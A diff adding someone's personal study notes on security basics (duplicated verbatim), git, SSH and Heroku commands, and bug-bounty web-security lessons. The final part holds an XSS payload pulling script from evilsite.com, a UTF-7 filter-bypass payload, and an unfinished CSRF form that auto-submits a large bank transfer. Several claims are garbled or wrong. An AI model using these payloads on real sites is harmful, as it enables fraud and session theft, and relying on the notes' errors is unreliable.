@@ -1170,3 +1170,2301 @@ cmd on attacker machine -> ssh username@remote_host
 
 
   
+Pseudonymity -> this means u have a identity over the internet but that is not real identity means it is used as alias for u to hide ur real
+                identity.
+
+CIA Triad -> Confidentiality Integrity Availability
+
+Parkerian Hexad -> Confidentiality Possession Integrity Authenticity Availability Utility
+
+Note -> one parameter which is not included in CIA Triad and Parkerian Hexad is Non-repudiation which means that one of the individual can deny
+        the sending and receiving of the msg or transaction
+
+If something is hashed then it could provide the integrity
+
+- Defence in Depth -> Prevent Detect Recover // this is the 3 layer of defences which should work in case of the breaching of application
+
+- Zero Knowledge Systems such as Crypton and encryptr are systems in the provider has zero knowledge about what they r hosting for their
+clients these systems much of the work is to make the files available and maintain their integrity
+
+- Security Bug and vulnerabilities r same, Unknown bugs(with no patch) r also known as Zero days // Known bugs can be fixed with patches
+  respective to them
+
+- Go to this link -> https://www.exploit-db.com/exploits/41744 to know the already known vulnerabilities
+
+- Script kitties // these r the hackers who just only use the other codes and do not write code them self
+
+- Malware -> these r programs written with malicious intent
+    Types ->
+    Macro Viruses -> this virus is written in macro language such as 'vbs', they r usally platform independent , they can be embedded into documents
+    and run automatically when that document is open such as Word or Excel document
+    Stealth viruses -> these r the viruses that r use to trick anti viruses software by intercepting it's request to the operation system and
+    providing false information
+    Polymorphic viruses -> Produces very operational copies of itself, it may have no parts that remain identical between the infections making
+    it very difficult to detect directly using signatures in anti virus software
+    Self-garbling viruses -> it attempts to hide from anti-virus software by modifying it's code, So it does not match predefined anti viruses
+    signatures
+    Bots & Zombies -> That's really a collection of hacked devices under a command and control of a hacker
+    Worms -> these viruses simply spread from one machine to another to another
+    OS Rootkit -> They r usally embedded into the kernel of the OS so it can hide it's existence completely from OS
+    Firmware Rootkit -> So for example from ur hard drives firmware chip u can have some sort of malware even formatting ur drive and reinstalling
+    the OS won't shift it
+    keyloggers -> they log ur key strokes
+    Trojan horses -> they r simply programs that appear to be one thing but r actually malware, So for example u download a piece of software
+    and it acts as a software but at the same time it is also malware at the back
+    RAT -> These r malicious programs that run on ur system and allow intruders to access ur system remotely
+
+ Malva Tyson -> this is an online advertisement that is infected with virus malware online, The owner of the websites often don't even know
+ what the specific ad will be shown
+ // Hackers place their own scripts to get around security checks add these scripts points to other scripts in different locations and repeat
+ this process few times untill u r to the user, this chain of scripts from different locations is hard to know for the advertising network
+ that the Advertisement is bad
+
+    Drive by attack -> in this only simply visiting websites that contain code to exploit ur machine// So don't think that going to the only
+    known websites will keep u safe
+    Spyware -> it's main purpose is to gather information and send it back to attacker
+    Adware -> it a software that forces advertisement on you , Ex -> coolwebsearch.com // this do browser hijacking
+
+    Note -> During the installation of software always opt for the custom installation
+
+    Scareware -> It is a type of social engineering attack to trick a person into believing that their is a treat but it actually isn't real
+
+    Potentially unwanted Programs(PUPs) -> these r the programs about which the antivirus or people who wants to remove them r not sure if
+    u want them or not , most often u don't want them
+
+    Phishing -> In phishing generally the users r tricked into clicking a link or executing a malware in some way to steal information
+
+    High Level Domains(HLD) -> .org, .net, .com , .co.uk etc
+
+    Real Domain -> The domain name to the left of the HLD that has no '/' to the left (not including http://)
+
+    Always check the domain names properly to secure ur self from phishing attacks
+    Ex -> https://stationx.net/sa/google.com/support/   -> here google.com is not a domain it is sub-directory
+
+    IDN(Internationalizied Domain Name) homograph attack -> is this the sites are misspelled always such as g00gle.com
+
+    Hidden Urls -> in this the false links are provided under clicks to redirect the user to attacker website
+
+    If u r able to put the <script> in the url of a website then it means u r able to access cookies and manipulate webpage
+
+    Not able to reproduce any attack in lecture 25
+
+    Vishing -> it is phone or we can say voice phishing
+    SMShinh -> It is SMS via phishing
+
+    PunnyCode conversion Concept -> https://hethical.io/homograph-attack-using-internationalized-domain-name/
+
+    Spam can come through instant msgs, forums, social media, text msgs also not just only from emails
+
+    Doxing means to do research on an individual or organization or company to find personal and private information and use this information
+    for blackmailing
+
+    CPU Hijackers Malware -> A crypto miner in cryptocurrency networks mining is a validation for doing transactions for doing the mining,
+    Successful miners obtain new cryptocurrency as a reward, So for mining the attackers use other peoples machines
+    // to avoid unwanted crypto mining always monitor ur CPU usage , u often notice this from ur browser processes due to javascript based
+     attacks from websites , So close those browsers and window immediatly
+     // u can also add extensions into ur browser such as "no coin"
+
+     Retro Reflectors r used to listen the voice they r like small audio transmission devices and r undectectable in RF scanners bcz they don't
+     need very much energy and do not emit any kind of radiation , same types of devices are for video cables and keyboards,
+
+     As these devices needs to be physically installed the process of doing it is called interdiction
+
+     JetPlow these r the devices which r used for the mass survillance with the coordination of CISCO
+     Nightstand it is an active wireless exploitation tool used for the close access operations where wired access to the target is not
+     possible, they can be used on drones too
+     Iratemonk -> if it is installed on ur machine then the formatting of hard drive or even reinstalling of OS won't help u and it is virtually
+     impossible to detect, which means in this case u can only throw the harddisk away
+
+     SIM cards can issue commands to ur handset , on of it's types is MonkeyCalender and then it sends SMS msgs informing what u r doing,
+     ur location etc
+     Candygram -> it is implemented over GSM cell towers and when ever a target handset enters the candygram base station area of influence
+     the system to send SMS through the external network
+
+     We used Formal methods which is used to verify the correctness of a system
+
+     Backdoors to be find in different systems is as follows
+     - In Closed Source -> Only way to find a backdoor is reverse engineering
+     - In Open Source -> the risk of backdoor is very less to be available
+
+     We can use the "reproducible builds" to check for the presence of backdoors // Reproducible builds are set of development practices which
+     create a verifiable path from human readable source code to a binary code used by computers , with reproducible builds multiple parties
+     redo build independently and ensure they all get exactly the same result , but it is not easy to do as the build system needs to be made
+     entirely deterministic and the build environment should either be recorded or predefined. and then u need to recreate a close enough
+     build environment, perform the build process and verify that the output matches the original build
+     // Debian provides currently the most reliable OS
+
+  https://www.google.com/search?q=wolf&rlz=1C1CHBD_enIN802IN802&oq=wolf&aqs=chrome..69i57j0l5.1330j0j8&sourceid=chrome&ie=UTF-8
+  // In the above url the transmission is by https so no one will know that what the user has searched or queried they will only know the
+   endpoint which is www.google.com
+
+   256AES -> here AES represents symmetric algorithm(uses 1 key while the asymmetric uses 2 keys) and 256 is the bit length , So higher the no. the better the algorithm and
+   slower it is to encrypt and decrypt and 256 also represents the key space which is no. of total possible different keys that u can have
+   with this encryption algorithm
+
+   to guess and crack the keys and algorithm we use Brute force, dictionary and hybrid(bruteforce + dictonary)
+
+   Types of Symmetric algorithm ->
+   - DES (Data Encryption Standard)
+   - Triple DES (3-DES)
+   - Blowfish
+   - RC4
+   - RC5
+   - RC6
+   - AES (Advanced Encryption Standard) // it is more preferable then others
+
+   Types of Aymmetric or Public & Private key algorithm ->
+   - RSA (Rivert-Shamir-Adleman) // it is used most commonly
+   - Elliptic curve cryptosystem (ECC)
+   - Diffie-Hellman (DH)
+   - El Gamal
+
+   Note -> The public and private keys r mathematically related and both the keys r generated at the same time , they have to be generated at
+   same time
+
+   // every website that uses https has a public and private key which they use to exchange symmetric session key to send ur encrypted data
+
+   // So in asymetric encrytpion if private key is used to encrypt the data then public key has to be used for the decryption and vice versa
+   but when we r encrypting with public key then their is no authentication means their is no way to find who send the encrypted data but when
+   we use the private key to encrypt the data then confidentiality is not guaranted as any one can read that data who has public key
+
+   So that's why the combination of encryption technologies is used, one of them is Crypto System, and then can provide services such as
+   Confidentiality, Authentication, Non Repudation, Integrity
+
+   but emails can't use these encryption technologies that easily as it is much complicated to apply them on emails , such as PGP can't be used
+   directly
+
+   Difference between Asymetric and Symetric
+   - Asymetric -> Better key distribution, Scalability, Authentication and non repudation, Slow, Mathematically intensive
+   - Symmetric -> Fast , Strong
+
+   // the asymetric is slower then the symmetric because the bit length of Asymetric is much higher then the symetric
+
+   // we cannot take the public key for use directly we need to authenticate the public key as it should be verified and we use hash and digital
+   signature for this
+   we can use tools such as "quick hash"
+
+   Never at any cost save ur password in browser
+
+   Digital Signatures -> it is a hashed value which is encrypted with the senders private key to produce the signed msg// So it provides the
+   features such as Authentication, non-repudiation and integrity
+   How to verify the Digital Certificate -> https://www.udemy.com/the-complete-internet-security-privacy-course-volume-1/learn/v4/t/lecture/5016170?start=225
+   we can also use the 'Device Guard' to verify the applications
+   
+   
+   ------------------------------------------------------------------------------------------------------------------
+   
+   
+   Set a Trap to know if Someone is Poking around into ur accounts Using Canary Tokens ->
+Case 1 ->
+  - Go to Link -> 'https://www.stationx.net/canarytokens/' on the link Click on button 'Start Creating Tokens'.
+  - Enter the email address u wanna send alerts to and enter the description or alert u wanna show
+  - Select the type for canary token such as DNS/HTTP , Browser Scanner etc. //here I choose DNS/HTTP
+  - Then Click on Generate Token Button and then a list appears and selct the type of file u want such as MS Word which U can download
+  - Now open the downloaded file
+  Note -> there is no guarentee it is going to work for all system and and all version of work 
+  - U can change the file name of the document u have downloaded
+  - Types of Data and things for which u can set this trap , because this is the data the hackers are looking for so go to following 
+  link-> https://www.stationx.net/canarytokens/
+  
+Case 2 ->
+  - Slect the token type as Browser Scanner
+  - And then from the list selct the WebBugs a link would be provided to u.
+  - Cpoy the link and then paste it to the Email u wanna send with some fake data , to the mail original receiver address becuse that's
+  the address u wanna monitor ,
+  - in the provided link u can change the last html name such as www.../.../.../index.html to www.../.../.../login.html
+  - Hide the link with some text or image or file and when any one click the link the alert would be send to u.
+  
+  U can use thunderbird email service provide to provide the image trap for above 
+  
+  To explore more in Risk Assessment Methods go to link https://www.stationx.net/sabsa/
+
+
+-----------------------------------------------------------------------------------------------------
+
+Pseudonymity -> this means u have a identity over the internet but that is not real identity means it is used as alias for u to hide ur real
+                identity.
+
+CIA Triad -> Confidentiality Integrity Availability
+
+Parkerian Hexad -> Confidentiality Possession Integrity Authenticity Availability Utility
+
+Note -> one parameter which is not included in CIA Triad and Parkerian Hexad is Non-repudiation which means that one of the individual can deny
+        the sending and receiving of the msg or transaction
+
+If something is hashed then it could provide the integrity
+
+- Defence in Depth -> Prevent Detect Recover // this is the 3 layer of defences which should work in case of the breaching of application
+
+- Zero Knowledge Systems such as Crypton and encryptr are systems in the provider has zero knowledge about what they r hosting for their
+clients these systems much of the work is to make the files available and maintain their integrity
+
+- Security Bug and vulnerabilities r same, Unknown bugs(with no patch) r also known as Zero days // Known bugs can be fixed with patches
+  respective to them
+
+- Go to this link -> https://www.exploit-db.com/exploits/41744 to know the already known vulnerabilities
+
+- Script kitties // these r the hackers who just only use the other codes and do not write code them self
+
+- Malware -> these r programs written with malicious intent
+    Types ->
+    Macro Viruses -> this virus is written in macro language such as 'vbs', they r usally platform independent , they can be embedded into documents
+    and run automatically when that document is open such as Word or Excel document
+    Stealth viruses -> these r the viruses that r use to trick anti viruses software by intercepting it's request to the operation system and
+    providing false information
+    Polymorphic viruses -> Produces very operational copies of itself, it may have no parts that remain identical between the infections making
+    it very difficult to detect directly using signatures in anti virus software
+    Self-garbling viruses -> it attempts to hide from anti-virus software by modifying it's code, So it does not match predefined anti viruses
+    signatures
+    Bots & Zombies -> That's really a collection of hacked devices under a command and control of a hacker
+    Worms -> these viruses simply spread from one machine to another to another
+    OS Rootkit -> They r usally embedded into the kernel of the OS so it can hide it's existence completely from OS
+    Firmware Rootkit -> So for example from ur hard drives firmware chip u can have some sort of malware even formatting ur drive and reinstalling
+    the OS won't shift it
+    keyloggers -> they log ur key strokes
+    Trojan horses -> they r simply programs that appear to be one thing but r actually malware, So for example u download a piece of software
+    and it acts as a software but at the same time it is also malware at the back
+    RAT -> These r malicious programs that run on ur system and allow intruders to access ur system remotely
+
+ Malva Tyson -> this is an online advertisement that is infected with virus malware online, The owner of the websites often don't even know
+ what the specific ad will be shown
+ // Hackers place their own scripts to get around security checks add these scripts points to other scripts in different locations and repeat
+ this process few times untill u r to the user, this chain of scripts from different locations is hard to know for the advertising network
+ that the Advertisement is bad
+
+    Drive by attack -> in this only simply visiting websites that contain code to exploit ur machine// So don't think that going to the only
+    known websites will keep u safe
+    Spyware -> it's main purpose is to gather information and send it back to attacker
+    Adware -> it a software that forces advertisement on you , Ex -> coolwebsearch.com // this do browser hijacking
+
+    Note -> During the installation of software always opt for the custom installation
+
+    Scareware -> It is a type of social engineering attack to trick a person into believing that their is a treat but it actually isn't real
+
+    Potentially unwanted Programs(PUPs) -> these r the programs about which the antivirus or people who wants to remove them r not sure if
+    u want them or not , most often u don't want them
+
+    Phishing -> In phishing generally the users r tricked into clicking a link or executing a malware in some way to steal information
+
+    High Level Domains(HLD) -> .org, .net, .com , .co.uk etc
+
+    Real Domain -> The domain name to the left of the HLD that has no '/' to the left (not including http://)
+
+    Always check the domain names properly to secure ur self from phishing attacks
+    Ex -> https://stationx.net/sa/google.com/support/   -> here google.com is not a domain it is sub-directory
+
+    IDN(Internationalizied Domain Name) homograph attack -> is this the sites are misspelled always such as g00gle.com
+
+    Hidden Urls -> in this the false links are provided under clicks to redirect the user to attacker website
+
+    If u r able to put the <script> in the url of a website then it means u r able to access cookies and manipulate webpage
+
+    Not able to reproduce any attack in lecture 25
+
+    Vishing -> it is phone or we can say voice phishing
+    SMShinh -> It is SMS via phishing
+
+    PunnyCode conversion Concept -> https://hethical.io/homograph-attack-using-internationalized-domain-name/
+
+    Spam can come through instant msgs, forums, social media, text msgs also not just only from emails
+
+    Doxing means to do research on an individual or organization or company to find personal and private information and use this information
+    for blackmailing
+
+    CPU Hijackers Malware -> A crypto miner in cryptocurrency networks mining is a validation for doing transactions for doing the mining,
+    Successful miners obtain new cryptocurrency as a reward, So for mining the attackers use other peoples machines
+    // to avoid unwanted crypto mining always monitor ur CPU usage , u often notice this from ur browser processes due to javascript based
+     attacks from websites , So close those browsers and window immediatly
+     // u can also add extensions into ur browser such as "no coin"
+
+     Retro Reflectors r used to listen the voice they r like small audio transmission devices and r undectectable in RF scanners bcz they don't
+     need very much energy and do not emit any kind of radiation , same types of devices are for video cables and keyboards,
+
+     As these devices needs to be physically installed the process of doing it is called interdiction
+
+     JetPlow these r the devices which r used for the mass survillance with the coordination of CISCO
+     Nightstand it is an active wireless exploitation tool used for the close access operations where wired access to the target is not
+     possible, they can be used on drones too
+     Iratemonk -> if it is installed on ur machine then the formatting of hard drive or even reinstalling of OS won't help u and it is virtually
+     impossible to detect, which means in this case u can only throw the harddisk away
+
+     SIM cards can issue commands to ur handset , on of it's types is MonkeyCalender and then it sends SMS msgs informing what u r doing,
+     ur location etc
+     Candygram -> it is implemented over GSM cell towers and when ever a target handset enters the candygram base station area of influence
+     the system to send SMS through the external network
+
+     We used Formal methods which is used to verify the correctness of a system
+
+     Backdoors to be find in different systems is as follows
+     - In Closed Source -> Only way to find a backdoor is reverse engineering
+     - In Open Source -> the risk of backdoor is very less to be available
+
+     We can use the "reproducible builds" to check for the presence of backdoors // Reproducible builds are set of development practices which
+     create a verifiable path from human readable source code to a binary code used by computers , with reproducible builds multiple parties
+     redo build independently and ensure they all get exactly the same result , but it is not easy to do as the build system needs to be made
+     entirely deterministic and the build environment should either be recorded or predefined. and then u need to recreate a close enough
+     build environment, perform the build process and verify that the output matches the original build
+     // Debian provides currently the most reliable OS
+
+  https://www.google.com/search?q=wolf&rlz=1C1CHBD_enIN802IN802&oq=wolf&aqs=chrome..69i57j0l5.1330j0j8&sourceid=chrome&ie=UTF-8
+  // In the above url the transmission is by https so no one will know that what the user has searched or queried they will only know the
+   endpoint which is www.google.com
+
+   256AES -> here AES represents symmetric algorithm(uses 1 key while the asymmetric uses 2 keys) and 256 is the bit length , So higher the no. the better the algorithm and
+   slower it is to encrypt and decrypt and 256 also represents the key space which is no. of total possible different keys that u can have
+   with this encryption algorithm
+
+   to guess and crack the keys and algorithm we use Brute force, dictionary and hybrid(bruteforce + dictonary)
+
+   Types of Symmetric algorithm ->
+   - DES (Data Encryption Standard)
+   - Triple DES (3-DES)
+   - Blowfish
+   - RC4
+   - RC5
+   - RC6
+   - AES (Advanced Encryption Standard) // it is more preferable then others
+
+   Types of Aymmetric or Public & Private key algorithm ->
+   - RSA (Rivert-Shamir-Adleman) // it is used most commonly
+   - Elliptic curve cryptosystem (ECC)
+   - Diffie-Hellman (DH)
+   - El Gamal
+
+   Note -> The public and private keys r mathematically related and both the keys r generated at the same time , they have to be generated at
+   same time
+
+   // every website that uses https has a public and private key which they use to exchange symmetric session key to send ur encrypted data
+
+   // So in asymetric encrytpion if private key is used to encrypt the data then public key has to be used for the decryption and vice versa
+   but when we r encrypting with public key then their is no authentication means their is no way to find who send the encrypted data but when
+   we use the private key to encrypt the data then confidentiality is not guaranted as any one can read that data who has public key
+
+   So that's why the combination of encryption technologies is used, one of them is Crypto System, and then can provide services such as
+   Confidentiality, Authentication, Non Repudation, Integrity
+
+   but emails can't use these encryption technologies that easily as it is much complicated to apply them on emails , such as PGP can't be used
+   directly
+
+   Difference between Asymetric and Symetric
+   - Asymetric -> Better key distribution, Scalability, Authentication and non repudation, Slow, Mathematically intensive
+   - Symmetric -> Fast , Strong
+
+   // the asymetric is slower then the symmetric because the bit length of Asymetric is much higher then the symetric
+
+   // we cannot take the public key for use directly we need to authenticate the public key as it should be verified and we use hash and digital
+   signature for this
+   we can use tools such as "quick hash"
+
+   Never at any cost save ur password in browser
+
+   Digital Signatures -> it is a hashed value which is encrypted with the senders private key to produce the signed msg// So it provides the
+   features such as Authentication, non-repudiation and integrity
+   How to verify the Digital Certificate -> https://www.udemy.com/the-complete-internet-security-privacy-course-volume-1/learn/v4/t/lecture/5016170?start=225
+   we can also use the 'Device Guard' to verify the applications
+   
+   
+   ---------------------------------------------------------------------------------------------------------------------
+   
+   GIT Commands->
+ Youtube url -> https://www.youtube.com/watch?v=MnUd31TvBoU&list=PL4cUxeGkcC9goXbgTDQ0n_4TBzOO0ocPR&index=11
+
+- git --version
+
+- git config --global user.name sadanand (Make user)
+
+- git config --global user.email sadanand1993mtr@gmail.com
+
+- git config user.name (Check User)
+
+- mkdir gitRep
+
+- touch index.html (Make File)
+
+-  git init (Make the master branch)
+
+-  git status (Check the changed and newly creted files not present in staging level)
+
+- git add index.html (add file to staging level)
+
+- git rm --cached index.html (To remove from staging level)
+
+- git add . (add all files to staging level)
+
+- git commit -m "commit msg" (To commit)
+
+- git log (To show all commit history)
+
+- git log --oneline (To show commit history a better way)
+
+- git checkout logId (This does not change anything just only show the code the way it was at that commit)
+
+- git checkout master (To go back to current state of code)
+
+- git revert logId(this is used to revert state of code to particular commit but does not remove the commit history)
+
+- git reset logId(this will go back to that commit state and remove the commit history after it)
+
+Note -> But the changes in files after it would be in unstaged level
+
+- git reset logId --hard (using this will not let code to be in unstaged stage as mentioned in Note)
+
+- git branch name_of_branch(create a new branch)
+
+- git branch -a(show all the branches)
+
+- git checkout branchName(To switch to branch)
+
+- git branch -D branchName (delete the branch)
+
+- git checkout -b branchName(it creates a branch also checkout to that branch)
+
+- To merge other branhes to master brach go to master branch
+  -git checkout master
+  -git merge branchName
+
+- If after commit the conflict comes then change the file as you like and removes comments from file come due to conflict
+	- git add .
+	- git commit (No need to enter the message)
+
+- git push git_url branchName (to push code into remote or online repository)
+
+- git remote add origin git_url (to give alias to the url) 
+	then - git push origin branchName
+
+- git clone git_url (to copy repository from git)
+
+- git remote -v (to get the origin git_url)
+
+- For handling the bracnhes in git online repo See above mentioned Youtube url video 11
+
+- Forking is the git feature which allows the online developers to change the code and send it to the original repository
+	see youtube url video 12
+
+- If something is changed in the master branch of the online repository then we have to first pull then only we could push
+	- git remote add origin git_url (to give alias to the url) 
+	then - git pull origin branchName
+	then - git push origin branchName
+	
+- Github by git bash and SSH keys 
+	- To explore git in detail go to https://git-scm.com/ and read the book ProGit
+	
+	- on the git bash
+	  cmds -> ls -a
+	  
+	 *then use the above mentioned cmds on cmder to commit the code in your own machine
+	 
+	 SSH keys are designed to let comunicate securely between two computers
+	 
+	 Guide to and Documentation for SSH keys->
+	 https://help.github.com/enterprise/2.14/user/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent/
+	 
+	 To check we have ssh keys availbale or not cmd -> ls -al ~/.ssh
+	 if their is no file ending with id_rsa or id_rsa.pub their their are no ssh keys
+	 
+	 To generate ssh key cmd -> ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
+	 after the above cmd press enter as defualt select for all the questions 
+	 
+	 after the above cmd we have to start ssh agent program so type cmd -> eval "$(ssh-agent -s)"  
+	 if you get o/p as Agent pid any_number then it means its running
+	 
+	 then use cmd -> ssh-add ~/.ssh/id_rsa
+	 then will identify you key pair which could be used to communicate with third party services such as github
+	 
+	 then go to your github account and navigate to settings then navigate to SSH and GPG Keys then click New SSH key
+	 
+	 then enter the title for your SSH key and use the following cmds and git bash to copy ssh key to clipboard
+	 cmd -> clip < ~/.ssh/id_rsa.pub if this cmd doesn't work then go to place where you .ssh folder is present
+	 such as -> /c/Users/sadanand.sharma/.ssh/id_rsa
+	 
+	 after adding the ssh key test whether the ssh key is correctly added or not by using the cmd on git bash
+	 cmd -> ssh -T git@github.com and if you are not connected then it wil help you get connect
+	 
+	 then add the origin url just like in cmder
+	 such as cmd -> git push -u origin master
+	 
+- to test if heroku is installed cmd-> heroku --help  
+	this will install cli if it is first time
+	
+- then login in to your heroku account locally
+	cmd -> heroku login
+	
+- to add ssh keys to heroku, cmd-> heroku keys:add
+- to remove the ssh keys from heroku, cmd-> heroku keys:remove email_of_keys
+- to check keys associated with heroku, cmd-> heroku keys
+
+- to test the connection between heroku and our get , cmd-> ssh -v git@heroku.com
+
+- for heroku to work properly and deploy the code few things have to be setup do following
+	
+	- use of 'env' variable , env is to see your environment variables type env on cmd prmpt
+	
+ - For heroku to work we need to define port as  (this below code is for nodejs and express) 
+        const port = process.env.PORT || 3000;   // here the process.env.PORT is for the deployed app and for local run it is 3000
+        // use above described port variable as for app.listen
+        app.listen(port,()=>{
+            console.log(`Server is running in Port ${port}`);
+        });
+
+- then specifiy things in package.json in the 'scripts' as
+"scripts": {
+    "start": "node server.js"	// this is let heroku know that which file to execute as heroku don't know which file to execute
+  }
+
+now we can use cmd 'npm start' to run app 
+
+- then use cmd-> heroku create // this is going to create a whole new application in heroku and also add new remote to git repository
+
+- then use cmd-> git push heroku // this will complete th deploying process and give the url which is generated
+	// we can copy that url or use cmd-> heroku open
+
+
+---------------------------------------------------------------------------------------------------
+
+Hacker one ->
+
+Playlist -> https://www.youtube.com/watch?v=DWBUQiaN5ZM&list=PLxhvVyxYRviZsAKXZEbmfsVMZp3s0KaVE&index=2
+- Always see the whole website very thoroughly by pressing every button and checking every thing
+
+HTTP Request ->
+GET / HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: text/html
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: keep-alive
+
+Request Headers ->
+Host -> Indicates the desired host handling the request
+Accept -> Indicates what MIME types r accepted by the client, often used to specify JSON or XML output for webservices
+Cookie -> Passes cookie data to the server
+Referer -> Page leading to this request(note: this is not passed to other servers when using HTTPS on the origin)
+Authorization -> Used for 'basic auth' pages(mainly).Takes the form "Basic<base64'd username:password>" // it does not do any form of encryption
+just a base64 blob of username and password
+
+Cookies r just key value pairs of data they r stored on the client for a fixed  period of time, they come from the server or added by JS and
+then r sent to each request to the domain that they're scoped for, each cookie has a domain pattern that actually matches sometimes it is specific
+and sometimes it is matching to root domain and it will fly to subdomain
+So if u can set cookies on domains u r not supposed to that would be a breach of security
+
+How r cookies secured?
+-  cookies added for .example.com can be read by any subdomain of example.com
+- cookies added for a subdomain can only be read in that subdomain and it's children subdomain
+- a subdomain can set cookies for it's own subdomains and it's parent but it can't set cookies for it's sibling domains
+Ex -> test.example.com can't set cookies for test2.example.com but can set cookie for example.com and it can also set cookie for
+foo.text.example.com which is it's child domain
+
+Their r 2 important flags that u can apply to cookies -> the user sent when the server actually sends a cookie down to a client and these r
+secure which means that the cookie will only work on HTTPS pages
+the HTTP only cookie -> it just only confirms that it only sends the cookies up with web requests, it won't allow u to read those cookies from
+Javascript and settings these cookies in JS will not actually set those values, So those r applied in the setCookie header that actually sets
+those
+Normally u can use the document.cookie variable in JS and get all the list of cookies that r applied or that r in scope and then u can also
+manipulate them that way
+
+HTML in security aspects ->
+What instance be parsed according to the relevant spec - this matters a lot, generally it is HTML 5 for most sites now, in reality HTML is not
+just parsed by browser it is actually also parsed by things like web application firewalls which sit in front of an application and look for things
+like Cross site scripting etc and if they r parsing in a different way ur browser is that will result in security vulnerability that u can exploit
+
+Ex ->
+<title>Vulnerable page named <script/xss src=http://evilsite.com/my.js></title>
+notice here instead of script tag we have script/xss // in the browser it will do nothing as u will end up with an empty XSS attribute on that
+tag but with a web app firewall that is improperly parsing HTML which is actually most of them it will see the script/xss tag and will let it
+straight through the filter // now days they got better but still they r pretty dumb
+
+Browser is supposed to be work with most of the web pages and the most web pages r broken in some way or another so their is lot of legacy
+parsing in browsers, and in html5 their r actually specifics on how that parsing should happen Ex-
+    - <script> tag on its own will automatically be closed at the end of the page, now suppose we r doing the XSS on the URL and their is the
+    filter for the slash but as it closes automatically it will just let it pass
+    - A tag missing its closing angle bracket will automatically be closed by the angle bracket of the next tag on the page
+    and these let to by pass firewall and parse properly in the web browser
+
+Content Sniffing -> it is when u can send data to the browser without giving it all the information about what it is u r sending it and all sorts
+of fill in the blanks
+Examples to this r mime type sniffing where it tries to figure out what type of file you r sending it , encoding sniffing where u r checking what
+sort of text encoding u r sending it such as ASCII, utf-8 etc it will sniff the content to see if it matches certain process and then it will
+use those behaviours inside of the browser
+
+Mime Sniffing -> it's not common anymore at least not as a security relevant issue but the browser just not look at the content-type header
+it will also look at what's on the page, if it has enough markers that make it look like HTML the browser will treat it as HTML
+- This lead to (internet explorer)ie 6/7 bugs where image and text files containing HTML tags would execute as HTML, it is still a big issue so u
+should look for that where u don't have proper mime types
+
+Ex -> Suppose u have a site with a file upload function for profile pictures, If that file contains enough HTML to trigger the sniffing process,
+an attacker could upload a picture and then link it to victims at this point they r able to execute anything that user can in the context of
+where that file was uploaded this is one of the reasons why sites use separate domains to host pictures and videos anything like that
+
+Encoding Sniffing -> the browser deals with it in a way that it will see a character that doesn't make sense in this encoding, so i am gonna
+try sniff in instead and u will end up in a page having mangled symbols which happen pretty often in modern browsers, if u don't specify
+encodings the browser will definitely apply these heuristics and if u can control the way that the browser decodes text u may be able to alter
+the parsing and u can also get around filters
+
+Ex -> putting a UTF-7(it is a 7 bit ascii with embedded base64 blocks) text into XSS payloads, So u basically have a base64 block that's blocked
+off with a plus and a minus and that will be the code to that character
+like this payload which is just a script tag with alert-> +ADw-script+AD4-alert(1);+ADw-/script+AD4- // this will go straight through HTML
+encoding, so it will by pass many sites when u throw it to them
+So their r no unsafe characters their what their are unsafe UTF-7 characters // so this can become a effective way to get around web app
+firewalls specifically bcz they will be looking for angle brackets and stuff like that they will not be looking for UTF-7,
+same way if they r expecting for ascii or utf-8 and u send utf-32 characters u r gonna by pass filter straight through
+// So u should be always specifying encoding and the encoding the browser should be parsing it in so the server and the client don't have a lack
+of compatibility same thing goes for mime types always specify mime types even if u r just sending an octet stream
+
+Same-origin policy(SOP) -> it is a kind of backbone of web security today, without it u wouldn't have the ability to move data between sub domains
+, u wouldn't have locks between separate domains etc, this is really what underpins browser security now.
+SOP can be understand as what domains u can contact via XML HTTP requests(Ajax requests as we normally call them), it also restricts access to
+DOM across frames and windows,
+So if u open up a new window with JavaScript u may or may not have access to the DOM in that new window which is determined by the same origin
+policy, this is what prevents u from making Ajax requests across domains with the exception of CORS requests
+SOP all prevents u from wreaking havoc on the web and any time a way around it is found bad things happen for everyone on the web
+
+Origin Matching Concept in SOP -> the way it works is like this-
+ - Protocols must match , u can never cross the http and https boundaries ever
+ - Port numbers must match
+ - Domain names must be an exact match, u can not go up and down subdomains any of that it must be an exact match
+
+SOP loosening -> U can change document.domain in JS and that will allow u to change which sub domain in essence u r able to communicate with
+and their r number of rules around this, u can also do msg posting with post message function for instance in JavaScript and u also have CORS
+these all open up a lot of different interesting avenues for attack, for instance u can always call postMessage into an iframe
+
+How many sites receiving msgs validate them properly ?
+Most of the times none of them , and when ever u do see msg handling in web app they almost handle it wrong in addition this was used to break
+lot of chrome extensions
+
+Chrome extensions r very limited in what they can do inside of their sandbox, so they use post message to move around and bcz u r always able
+to post to these extensions they were vulnerable to cross site scripting in lot of cases and this can be even used to jump from one web page
+or one tab to another through these extensions
+So generally if u don't have very good reason to do it u shouldn't use SOP and this leads to design problem if u try to do that
+
+CORS -> It allows u to make request to cross domains outside of SOP using XmlHttpRequests also comes into play with WebGL in that they can read
+textures across domains, CORS r still really new and then enable some kind of risky situation, as u can make it has received domains cookies,
+So if u make request from foo.com to bar.com and bar.com actually has the CORS headers u can make it send the proper cookies on bar.com upto
+that server and u can't access those urself but u can potentially compromise logged in users and this isn't even explored much
+
+CSRF Attacks -> it's simple and u find it everywhere and u will find their is kind of no prevention against it and this is a common thing
+it's most of the times that 1 app out of 5 to 6 apps test fall prey to sea surf attacks
+
+Cross Site Request Forgery -> it is basically when an attacker can get a victim to a page that they control and then it submits data to some
+target site as the victim, it's very common
+Ex -> Bank transfer site code
+<form action="/levels/0/" method="POST">                // this form allows transfer from one account to another and have POST
+    <h2>Transfer Funds</h2>
+    Destination account: <input type="input" name="to" value=""><br>    // variables for destination account and amount
+    Amount: <input type="input" name="amount" value="">
+    <br>
+    <br>
+    <input type="submit" value="transfer">  // submit button
+</form>
+
+So when the server gets such as request, how can it know it came from the real site and went to original form and entered that data, u have to
+referrer headers for HTTP requests but they r not that much reliable so they can be forged
+
+This is actual Exploit that will transfer money if the users r logged in Ex ->
+
+<body onload="document.forms[0].submit()">
+    <form action="https://victim.vulnerable/levels/0/" method="POST">
+        <input type="hidden" name="amount" value="10000000">
+        <input type="hidden" name="to" value="1625">        // here transfers from user account to account no. 1625 and this happens instantly
